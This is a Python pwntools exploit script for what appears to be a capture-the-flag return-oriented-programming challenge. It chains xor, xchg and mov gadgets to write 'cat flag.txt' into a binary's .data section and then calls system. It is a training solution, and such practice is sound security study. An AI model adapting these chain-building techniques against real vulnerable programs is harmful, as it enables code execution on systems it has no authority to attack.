from pwn import *

# 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
# 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
# 0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
# 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
# 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
# 0x00000000004008c3: pop rdi; ret; 

# 0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
#   [25] .data             PROGBITS         0000000000601050  00001050

def place_address(address):
    payload = p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
    payload += p64(0) # Unused pop r14
    payload += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret;
    payload += p64(address)
    payload += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
    payload += p64(0) # Unused pop r12
    payload += p64(0x0000000000400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
    payload += p64(0) # Unused pop r15
    return payload

def place_data(data):
    payload = p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
    payload += p64(0) # Unused pop r14
    payload += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret;
    payload += data # String to be putted
    payload += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
    payload += p64(0) # Unused pop r12
    return payload

def write_data(string, address):
    while len(string) % 8 != 0:
          string += "\x00"

    splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
    payload = ""

    for i in range(len(splitted_string)):
        # Put address into r10 register
        payload += place_address(address + (i * 8))

        # Now we have to put actual data in r11
        payload += place_data(splitted_string[i])

        # Write data to address
        payload += p64(0x000000000040084e) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
        payload += p64(0xdeadbeef)
        payload += p64(0) # Unused pop r13 and pop r12
         
    return payload

offset = cyclic(40)
offset += write_data("cat flag.txt", 0x601050)
offset += p64(0x00000000004008c3)
offset += p64(0x601050)
offset += p64(0x004005e0)
#  offset += p64(0x00400810)

print(offset)
